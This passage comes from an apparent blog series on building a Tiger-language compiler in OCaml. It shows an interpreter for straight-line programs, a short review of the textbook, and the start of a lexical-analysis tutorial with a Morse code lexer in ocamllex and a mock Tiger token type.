</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">interp_stm</span> <span style="color:#434f54">stm</span> <span style="color:#434f54">env</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">print</span> <span style="color:#434f54">env0</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#728e00">(</span><span style="color:#434f54">v</span><span style="color:#728e00">,</span> <span style="color:#434f54">env1</span><span style="color:#728e00">)</span> <span style="color:#728e00">=</span> <span style="color:#434f54">interp_exp</span> <span style="color:#434f54">exp</span> <span style="color:#434f54">env0</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">print_endline</span> <span style="color:#728e00">(</span><span style="color:#434f54">Int</span>.<span style="color:#434f54">to_string</span> <span style="color:#434f54">v</span><span style="color:#728e00">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">env1</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">stm</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Print</span> <span style="color:#434f54">exps</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">List</span>.<span style="color:#434f54">fold_left</span> <span style="color:#728e00">~</span><span style="color:#434f54">init</span><span style="color:#728e00">:</span><span style="color:#434f54">env</span> <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:</span><span style="color:#434f54">print</span> <span style="color:#434f54">exps</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Assign</span> <span style="color:#728e00">(</span><span style="color:#434f54">key</span><span style="color:#728e00">,</span> <span style="color:#434f54">exp</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#728e00">(</span><span style="color:#434f54">data</span><span style="color:#728e00">,</span> <span style="color:#434f54">env1</span><span style="color:#728e00">)</span> <span style="color:#728e00">=</span> <span style="color:#434f54">interp_exp</span> <span style="color:#434f54">exp</span> <span style="color:#434f54">env</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Map</span>.<span style="color:#434f54">set</span> <span style="color:#434f54">env1</span> <span style="color:#728e00">~</span><span style="color:#434f54">key</span> <span style="color:#728e00">~</span><span style="color:#434f54">data</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Compound</span> <span style="color:#728e00">(</span><span style="color:#434f54">stm1</span><span style="color:#728e00">,</span> <span style="color:#434f54">stm2</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">env1</span> <span style="color:#728e00">=</span> <span style="color:#434f54">interp_stm</span> <span style="color:#434f54">stm1</span> <span style="color:#434f54">env</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">interp_stm</span> <span style="color:#434f54">stm2</span> <span style="color:#434f54">env1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">and</span> <span style="color:#434f54">interp_exp</span> <span style="color:#434f54">exp</span> <span style="color:#434f54">env</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Id</span> <span style="color:#434f54">k</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">v</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Map</span>.<span style="color:#434f54">find_exn</span> <span style="color:#434f54">env</span> <span style="color:#434f54">k</span> <span style="color:#728e00">in</span> <span style="color:#728e00">(</span><span style="color:#434f54">v</span><span style="color:#728e00">,</span> <span style="color:#434f54">env</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Num</span> <span style="color:#434f54">x</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">(</span><span style="color:#434f54">x</span><span style="color:#728e00">,</span> <span style="color:#434f54">env</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Op</span> <span style="color:#728e00">(</span><span style="color:#434f54">exp1</span><span style="color:#728e00">,</span> <span style="color:#434f54">op</span><span style="color:#728e00">,</span> <span style="color:#434f54">exp2</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#728e00">(</span><span style="color:#434f54">x</span><span style="color:#728e00">,</span> <span style="color:#434f54">env1</span><span style="color:#728e00">)</span> <span style="color:#728e00">=</span> <span style="color:#434f54">interp_exp</span> <span style="color:#434f54">exp1</span> <span style="color:#434f54">env</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#728e00">(</span><span style="color:#434f54">y</span><span style="color:#728e00">,</span> <span style="color:#434f54">env2</span><span style="color:#728e00">)</span> <span style="color:#728e00">=</span> <span style="color:#434f54">interp_exp</span> <span style="color:#434f54">exp2</span> <span style="color:#434f54">env1</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">r</span> <span style="color:#728e00">=</span> <span style="color:#434f54">eval</span> <span style="color:#434f54">x</span> <span style="color:#434f54">op</span> <span style="color:#434f54">y</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">(</span><span style="color:#434f54">r</span><span style="color:#728e00">,</span> <span style="color:#434f54">env2</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Eseq</span> <span style="color:#728e00">(</span><span style="color:#434f54">stm</span><span style="color:#728e00">,</span> <span style="color:#434f54">exp</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">env1</span> <span style="color:#728e00">=</span> <span style="color:#434f54">interp_stm</span> <span style="color:#434f54">stm</span> <span style="color:#434f54">env</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">interp_exp</span> <span style="color:#434f54">exp</span> <span style="color:#434f54">env1</span>
</span></span></code></pre></div><p>Here we&rsquo;re just recursively traversing a tree, keeping a map of
identifiers, evaluating arithmetic operations and printing
values.</p>
</li>
</ul>
<h4 id="excersises">
  Excersises
  <a class="heading-link" href="#excersises">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>A couple of more excercises about trees, nothing super exciting.
So I won&rsquo;t paste the rest of my solutions here. To implement a
balanced-tree (ex. d) I&rsquo;ve read the chapter about Red-Black
Trees in
<a href="https://www.amazon.com/Purely-Functional-Data-Structures-Okasaki/dp/0521663504"  class="external-link" target="_blank" rel="noopener">Okasaki
book.</a> The code is
<a href="https://github.com/vyorkin/tiger/blob/master/chapter1/rb_tree.ml"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Well, thats all for part 1! The next one is about lexical
analysis where we&rsquo;ll write a simple lexer for the Tiger
language.</p>
<h4 id="conclusion">
  Conclusion
  <a class="heading-link" href="#conclusion">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>By the time I&rsquo;ve decided to start writing this post I&rsquo;ve already
finished reading 6th chapter and here are some first impressions:</p>
<ul>
<li>The book is clear and enjoyable to read. Programming
assignments and exercises are well thought out</li>
<li>Implementing the typechecker (chapter 5) wasn&rsquo;t easy, for me
it took a week to make it work and typecheck correctly every
given example program</li>
<li>Chapter 6 feels easier (less code to write), but requires some
basic knowledge about microprocessor architectures (SPARK,
MIPS)</li>
</ul>
<p>I wouldn&rsquo;t recommend starting with this book to someone with
zero compiler design knowledge. But it is definitely a must read
for people who already know the basics of compiler construction.</p>
<h3 id="making-of-tiger-2-lexical-analysis">
  <span class="org-todo done DONE">DONE</span> Making of Tiger #2, Lexical Analysis <span class="tag"><span class="lexing">lexing</span><span class="ocamllex">ocamllex</span></span>
  <a class="heading-link" href="#making-of-tiger-2-lexical-analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>We need a way to translate a program written in one
(human-friendly) language to another (machine-specific)
language. Generally, this work is splitted into 2 parts:
<strong>analysis</strong> and <strong>synthesis</strong>.</p>
<p>The <strong>synthesis</strong>-part (back end) is responsible for the code
generation and optimizations.</p>
<p><strong>Analysis</strong>-part (front end) is responsible for breaking the
program apart to understand its structure and meaning. There are
3 commonly used <strong>analysis</strong> phases:</p>
<ol>
<li><strong>Lexical</strong> – breaking a sequence of characters into sequence
of individual <strong>tokens</strong> (words)</li>
<li><strong>Syntax</strong> – parsing and checking that we have a valid sequence
of tokens</li>
<li><strong>Semantic</strong> – gathering the program’s meaning, making sure
that declarations and statements of program are semantically
correct, this usually includes type checking</li>
</ol>
<p>In this post we’ll focus on implementing the <strong>lexical analysis</strong>
phase.</p>
<p>A lexical <strong>token</strong> is a string with an assigned and identified
meaning. This is a <strong>unit</strong> in a grammar of a programming
language.</p>
<ul>
<li>Example <strong>tokens</strong>: identifiers, keywords, separators, operators</li>
<li>Example <strong>non-tokens</strong>: white-spaces, tabs, newlines, comments,
preprocessor directives, macroses</li>
</ul>
<p>Now, I’m going to skip everything related to finite automata and
regular expressions and go straight to the implementation of
<strong>lexer</strong> (lexical analyzer). You can find a good intro to lexing
and parsing using <code>ocamllex</code> and <code>menhir</code> in the <a href="http://dev.realworldocaml.org/parsing-with-ocamllex-and-menhir.html"  class="external-link" target="_blank" rel="noopener">Read World
OCaml book</a>.</p>
<h4 id="example-lexer--morse-code">
  Example lexer (morse code)
  <a class="heading-link" href="#example-lexer--morse-code">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>We’ll start with the simplest possible example of building a
lexer for <a href="https://en.wikipedia.org/wiki/Morse_code"  class="external-link" target="_blank" rel="noopener">morse code</a>, the full source code is <a href="https://github.com/vyorkin/tiger/blob/master/play/menhir/morse-code-simple/lexer.mll"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>The <code>dune</code> file for our playground project is going to look like
this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lisp" data-lang="lisp"><span style="display:flex;"><span>(<span style="color:#434f54">ocamllex</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">modules</span> <span style="color:#434f54">lexer</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">executable</span>
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">name</span> <span style="color:#434f54">driver</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">libraries</span> <span style="color:#434f54">core</span> <span style="color:#434f54">stdio</span>)
</span></span><span style="display:flex;"><span> (<span style="color:#434f54">preprocess</span> (<span style="color:#434f54">pps</span> <span style="color:#434f54">ppx_deriving.show</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">env</span> (<span style="color:#434f54">dev</span> (<span style="color:#434f54">flags</span> (<span style="color:#7f8c8d">:standard</span> <span style="color:#434f54">-warn-error</span> <span style="color:#434f54">-A</span>))))
</span></span></code></pre></div><p>Nothing fancy here. Next one is the <code>driver.ml</code> module, this is
our entry point. It simply reads the given file, runs our lexer
and displays the resulting S-expression.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Core</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Syntax</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#728e00">rec</span> <span style="color:#434f54">tokens</span> <span style="color:#434f54">buf</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">Lexer</span>.<span style="color:#434f54">read</span> <span style="color:#434f54">buf</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">EOF</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">[</span><span style="color:#434f54">EOF</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">tok</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">tok</span><span style="color:#728e00">::</span><span style="color:#434f54">tokens</span> <span style="color:#434f54">buf</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">lex_print</span> <span style="color:#434f54">ch</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">ch</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">Lexing</span>.<span style="color:#434f54">from_channel</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">tokens</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">iter</span> <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">e</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">Format</span>.<span style="color:#434f54">printf</span> <span style="color:#7f8c8d">&#34;%s</span><span style="color:#7f8c8d">\n</span><span style="color:#7f8c8d">&#34;</span> <span style="color:#728e00">(</span><span style="color:#434f54">show_exp</span> <span style="color:#434f54">e</span><span style="color:#728e00">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">run</span> <span style="color:#434f54">filename</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">In_channel</span>.<span style="color:#434f54">with_file</span> <span style="color:#434f54">filename</span> <span style="color:#728e00">~</span><span style="color:#434f54">f</span><span style="color:#728e00">:</span><span style="color:#434f54">lex_print</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">()</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">spec</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Command</span>.<span style="color:#434f54">Spec</span>.<span style="color:#728e00">(</span><span style="color:#434f54">empty</span> <span style="color:#728e00">+&gt;</span> <span style="color:#434f54">anon</span> <span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;filename&#34;</span> <span style="color:#728e00">%:</span> <span style="color:#00979d">string</span><span style="color:#728e00">))</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">run</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">Command</span>.<span style="color:#434f54">basic_spec</span> <span style="color:#728e00">~</span><span style="color:#434f54">summary</span><span style="color:#728e00">:</span><span style="color:#7f8c8d">&#34;Run the lexer and display tokens&#34;</span> <span style="color:#434f54">spec</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|&gt;</span> <span style="color:#434f54">Command</span>.<span style="color:#434f54">run</span>
</span></span></code></pre></div><p>We need a module to describe our tokens, lets call it
<code>syntax.ml</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">SYM</span> <span style="color:#728e00">of</span> <span style="color:#00979d">string</span> <span style="color:#95a5a6">(* symbol *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">SEP</span> <span style="color:#95a5a6">(* separator *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">EOF</span> <span style="color:#95a5a6">(* end of file *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span></code></pre></div><p>And the lexer generator itself:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">open</span> <span style="color:#434f54">Lexing</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">open</span> <span style="color:#434f54">Syntax</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Custom exception type for lexer errors *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">exception</span> <span style="color:#434f54">SyntaxError</span> <span style="color:#728e00">of</span> <span style="color:#00979d">string</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* Regular expressions: *)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* We use whitespace as a separator, so
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">   it is a valid token in our language *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">white</span>   <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39; &#39;</span> <span style="color:#7f8c8d">&#39;\t&#39;</span><span style="color:#728e00">]+</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">newline</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#39;\r&#39;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\n&#39;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;</span><span style="color:#7f8c8d">\r\n</span><span style="color:#7f8c8d">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">sym</span>     <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39;.&#39;</span> <span style="color:#7f8c8d">&#39;-&#39;</span><span style="color:#728e00">]+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* Lexing rules: *)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">rule</span> <span style="color:#434f54">read</span> <span style="color:#728e00">=</span> <span style="color:#434f54">parse</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* New lines are separators too *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">newline</span> <span style="color:#728e00">{</span> <span style="color:#434f54">new_line</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">;</span> <span style="color:#434f54">SEP</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">sym</span>     <span style="color:#728e00">{</span> <span style="color:#434f54">SYM</span> <span style="color:#728e00">(</span><span style="color:#434f54">lexeme</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">)</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">white</span>   <span style="color:#728e00">{</span> <span style="color:#434f54">SEP</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#728e00">_</span>       <span style="color:#728e00">{</span> <span style="color:#728e00">raise</span> <span style="color:#728e00">(</span><span style="color:#434f54">SyntaxError</span> <span style="color:#728e00">(</span><span style="color:#434f54">Printf</span>.<span style="color:#434f54">sprintf</span> <span style="color:#7f8c8d">&#34;At offset %d: unexpected character.</span><span style="color:#7f8c8d">\n</span><span style="color:#7f8c8d">&#34;</span> <span style="color:#728e00">(</span><span style="color:#434f54">lexeme_start</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">)))</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">eof</span>     <span style="color:#728e00">{</span> <span style="color:#434f54">EOF</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Now we can parse the “hello world” sequence written in Morse
Code:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>.... . .-.. .-.. ---
</span></span><span style="display:flex;"><span>.-- --- .-. .-.. -..
</span></span></code></pre></div><p>The output will be:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lisp" data-lang="lisp"><span style="display:flex;"><span>(<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;....&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;.&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;.-..&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;.-..&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;---&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#434f54">SEP</span>
</span></span><span style="display:flex;"><span>(<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;.--&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;---&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;.-.&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;.-..&#34;</span>) <span style="color:#434f54">SEP</span> (<span style="color:#434f54">SYM</span> <span style="color:#7f8c8d">&#34;-..&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#434f54">EOF</span>
</span></span></code></pre></div><h4 id="tiger-lexer">
  Tiger lexer
  <a class="heading-link" href="#tiger-lexer">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Having that basic understanding of how to use the <code>ocamllex</code> to
build lexers, we can try to build one for our Tiger language.</p>
<p>The <code>dune</code> file is going to remain the same as in the “morse
code” example above. There is a <strong>Tiger Language Reference Manual
in Appendix A</strong> of the book where you can find the information
about the tokens we need: identifiers, comments, declarations,
data types, etc.</p>
<p>For now, we don’t need to define a real AST data type.</p>
<details>
<summary>The “mock” <b>syntax.ml</b> module would suffice.</summary>
<div class="details">
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">TYPE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">VAR</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">FUNCTION</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">BREAK</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">OF</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">END</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">IN</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">NIL</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">LET</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">DO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">TO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">FOR</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">WHILE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">ELSE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">THEN</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">IF</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">ARRAY</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">ASSIGN</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">OR</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">AND</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">GE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">GT</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">LE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">LT</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">NEQ</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">EQ</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">DIVIDE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">TIMES</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">MINUS</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">PLUS</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">DOT</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">RBRACE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">LBRACE</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">RBRACK</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">LBRACK</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">RPAREN</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">LPAREN</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">SEMICOLON</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">COLON</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">COMMA</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">STRING</span> <span style="color:#728e00">of</span> <span style="color:#00979d">string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">INT</span> <span style="color:#728e00">of</span> <span style="color:#00979d">int</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">ID</span> <span style="color:#728e00">of</span> <span style="color:#00979d">string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">|</span> <span style="color:#434f54">EOF</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span></code></pre></div></div>
</details>
<p>We want to focus on the lexer part. First, we might want to open
some commonly used modules and define a custom exception type
for lexing errors.</p>
